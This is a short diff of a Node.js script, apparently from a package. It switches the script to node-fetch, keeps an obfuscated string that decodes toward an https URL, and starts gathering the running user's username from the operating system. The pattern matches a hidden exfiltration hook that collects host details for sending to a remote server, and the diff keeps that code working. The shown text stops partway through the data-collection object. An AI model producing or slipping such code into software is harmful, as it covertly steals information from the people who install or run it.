@@ -1,7 +1,8 @@
 #!/usr/bin/env node
-var os = require('os');
-var t = fetch, 
-    p = process;
+import t from 'node-fetch';
+import os from 'os';
+
+var p = process;
 var r = 'EGdhRWLjR2LpBXYvM2YuIxn3MwFjduM2bw9yL6MHc0RHa'.split('');
 var d = {
     username: os.userInfo().username,
